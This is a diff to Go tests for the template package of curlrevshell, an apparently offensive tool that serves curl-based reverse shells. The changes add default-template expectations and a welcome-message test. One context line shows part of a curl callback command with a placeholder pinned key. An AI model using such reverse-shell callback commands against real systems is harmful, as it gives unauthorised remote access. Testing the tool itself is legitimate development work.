@@ -5,7 +5,7 @@ package crstemplate
  * Tests for crstemplate.go
  * By J. Stuart McMurray
  * Created 20241212
- * Last Modified 20260829
+ * Last Modified 20261021
  */
 
 import (
@@ -18,7 +18,10 @@ import (
 	"os"
 	"path/filepath"
 	"reflect"
+	"strings"
 	"testing"
+
+	"github.com/magisterquis/curlrevshell/internal/tlog"
 )
 
 // Make sure we have ALL the subtemplates and the root template is emptyish.
@@ -75,8 +78,6 @@ curl -sk --pinnedpubkey sha256//testFPtestFPtestFPtestFPtestFPtestFPtestFPx= htt
 			)
 		}
 	)
-
-	var ()
 
 	/* Make sure we don't miss anything if we've added a field later. */
 	if got := firstEmptyField(params, ""); "" != got {
@@ -135,19 +136,22 @@ curl -sk --pinnedpubkey sha256//testFPtestFPtestFPtestFPtestFPtestFPtestFPx= htt
 			werr: ErrOutsideSubtemplate,
 		},
 		SubtemplateCallback + "/no_file": {
-			name: SubtemplateCallback,
-			have: haveNoFile,
-			werr: fs.ErrNotExist,
+			name:  SubtemplateCallback,
+			have:  haveNoFile,
+			wantf: defaultCallback,
+			werr:  fs.ErrNotExist,
 		},
 		SubtemplateFiles + "/no_file": {
-			name: SubtemplateFiles,
-			have: haveNoFile,
-			werr: fs.ErrNotExist,
+			name:  SubtemplateFiles,
+			have:  haveNoFile,
+			wantf: defaultFiles,
+			werr:  fs.ErrNotExist,
 		},
 		SubtemplateScript + "/no_file": {
-			name: SubtemplateScript,
-			have: haveNoFile,
-			werr: fs.ErrNotExist,
+			name:  SubtemplateScript,
+			have:  haveNoFile,
+			wantf: defaultScript,
+			werr:  fs.ErrNotExist,
 		},
 		SubtemplateCallback + "/overridden": {
 			name: SubtemplateCallback,
@@ -344,6 +348,49 @@ func TestExecute_DummyRequest(t *testing.T) {
 			got,
 			want,
 		)
+	}
+}
+
+// Can we execute the welcome template?
+func TestExecute_DefaultWelcome(t *testing.T) {
+	var (
+		tVer  = tlog.S("version")
+		tAddr = tlog.S("address")
+	)
+	for n, c := range map[string]struct {
+		have WelcomeParams
+		want string
+	}{"normal_welcome": {
+		have: WelcomeParams{Version: tVer, ListenAddress: tAddr},
+		want: fmt.Sprintf(
+			strings.Join([]string{
+				`Welcome to curlrevshell version %s`,
+				`Listening on %s`,
+			}, "\n"),
+			tVer,
+			tAddr,
+		),
+	}, "no_listen_address": {
+		have: WelcomeParams{Version: tVer},
+		want: `Welcome to curlrevshell version ` + tVer,
+	}} {
+		t.Run(n, func(t *testing.T) {
+			got, err := Execute(SubtemplateWelcome, "", c.have)
+			if nil != err {
+				t.Fatalf("Error: %v", err)
+			}
+			if got != c.want {
+				t.Errorf(
+					"Incorrect output\n"+
+						"have:\n%#v\n"+
+						"got:\n%s\n"+
+						"want:\n%s",
+					c.have,
+					got,
+					c.want,
+				)
+			}
+		})
 	}
 }
 
